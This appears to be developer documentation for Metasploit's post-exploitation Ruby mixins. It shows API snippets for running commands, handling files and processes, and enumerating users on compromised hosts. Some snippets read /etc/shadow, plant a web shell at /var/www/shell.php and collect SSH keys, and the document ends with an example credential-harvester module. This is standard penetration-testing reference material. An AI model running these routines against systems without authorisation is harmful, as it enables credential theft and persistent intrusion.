# Post Exploitation Mixins

Post exploitation mixins provide a consistent API for interacting with compromised systems across different session types (Meterpreter, shell, PowerShell). Located in `lib/msf/core/post/`, these mixins abstract platform and session type differences.

## Msf::Post::Common

Core utilities for command execution and session interaction.

```ruby
include Msf::Post::Common

# Modern API - use create_process for commands with arguments
output = create_process('grep', args: ['-r', pattern, '/var/log'], time_out: 30, opts: { 'Hidden' => true })

# Legacy API - cmd_exec only for static command strings
hostname = cmd_exec('hostname')

# Environment variables
env_vars = get_envs('HOME', 'USER', 'PATH')  # Returns hash of env vars
home = get_env('HOME')                        # Single variable

# Check command availability
if command_exists?('python3')
  version = create_process('python3', args: ['--version'])
end

# Session information
target = "#{rhost}:#{rport}"  # Or use: peer
```

## Msf::Post::File

Cross-platform file system operations.

```ruby
include Msf::Post::File

# Navigation and listing
current = pwd
cd('/tmp')
files = dir('/etc')  # or ls('/etc')

# File checks
if file?('/etc/passwd') && readable?('/etc/passwd')
  content = read_file('/etc/passwd')
  store_loot('passwd', 'text/plain', session, content)
end

if directory?('/var/www') && writable?('/var/www')
  write_file('/var/www/shell.php', payload)
end

# File operations
mkdir('/tmp/staging')              # Auto-registered for cleanup
data = read_file('/etc/shadow')
write_file('/tmp/output.txt', data)
hash = file_remote_digestmd5('/bin/bash')

# Path expansion
expanded = expand_path('$HOME/.ssh/id_rsa')  # Unix
expanded = expand_path('%APPDATA%\\data')     # Windows
```

## Msf::Post::Process

Process enumeration and manipulation.

```ruby
include Msf::Post::Process

# Enumerate processes
processes = get_processes
processes.each { |p| print_line("#{p['pid']}: #{p['name']}") }

# Find specific processes
nginx_pids = pidof('nginx')
if nginx_pids.any?
  print_good("Found nginx: #{nginx_pids.join(', ')}")
  nginx_pids.each { |pid| kill_process(pid) }
end

# Check process existence
if has_pid?(1234)
  print_good("Process 1234 is running")
end
```

## Msf::Post::Unix

Unix/Linux-specific utilities.

```ruby
include Msf::Post::Unix

# Privilege checking
if is_root?
  print_good("Running as root")
else
  print_warning("Running as #{whoami}")
end

# User enumeration
users = get_users
users.each do |u|
  print_line("#{u['name']} (UID: #{u['uid']}, Shell: #{u['shell']})")
end
admin_users = users.select { |u| u['uid'].to_i == 0 }

# Group enumeration
groups = get_groups
sudo_group = groups.find { |g| g['name'] =~ /sudo|wheel/ }
print_good("Sudo users: #{sudo_group['users']}") if sudo_group

# Find SSH keys and interesting files
ssh_keys = enum_user_directories
ssh_keys.each do |key|
  content = read_file(key)
  store_loot('ssh.key', 'text/plain', session, content, key)
end
```

## Platform-Specific Mixins

### Msf::Post::Windows
Windows-specific operations including registry manipulation, service management, and Windows API access. See Windows-specific documentation.

### Msf::Post::Linux
Linux-specific system information gathering and kernel utilities.

### Msf::Post::OSX
macOS-specific utilities and system interaction methods.

### Msf::Post::Android
Android device interaction and data collection methods.

### Msf::Post::Hardware
Hardware interaction utilities (e.g., USB devices, serial ports).

## Example Module

```ruby
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Linux Credential Harvester',
      'Description' => 'Collects credentials from Linux system',
      'License' => MSF_LICENSE,
      'Author' => ['Your Name'],
      'Platform' => ['linux'],
      'SessionTypes' => ['meterpreter', 'shell']
    ))
  end

  def run
    print_status("Harvesting credentials on #{peer}")
    
    if is_root?
      # Root access - collect shadow file
      if readable?('/etc/shadow')
        shadow = read_file('/etc/shadow')
        store_loot('shadow', 'text/plain', session, shadow, '/etc/shadow')
      end
    end
    
    # Collect SSH keys
    ssh_keys = enum_user_directories
    ssh_keys.each do |key_path|
      key = read_file(key_path)
      store_loot('ssh.key', 'text/plain', session, key, key_path)
    end
    
    # Check for interesting processes
    if pidof('sshd').any?
      print_good("SSH daemon running")
    end
  end
end
```

## Best Practices

- **Use `create_process`** for commands with arguments: `create_process('ls', args: ['-la', path])`
- **Use `cmd_exec`** only for static strings: `cmd_exec('hostname')`
- **Check before acting**: Use `file?()`, `readable?()`, `writable?()` before file operations
- **Handle errors**: Wrap operations in `begin/rescue` blocks
- **Register cleanup**: Files created with `write_file()` are auto-registered; use `register_file_for_cleanup()` for others
- **Store loot properly**: Use `store_loot()` to save collected data
- **Check session type**: Some operations behave differently on Meterpreter vs shell sessions

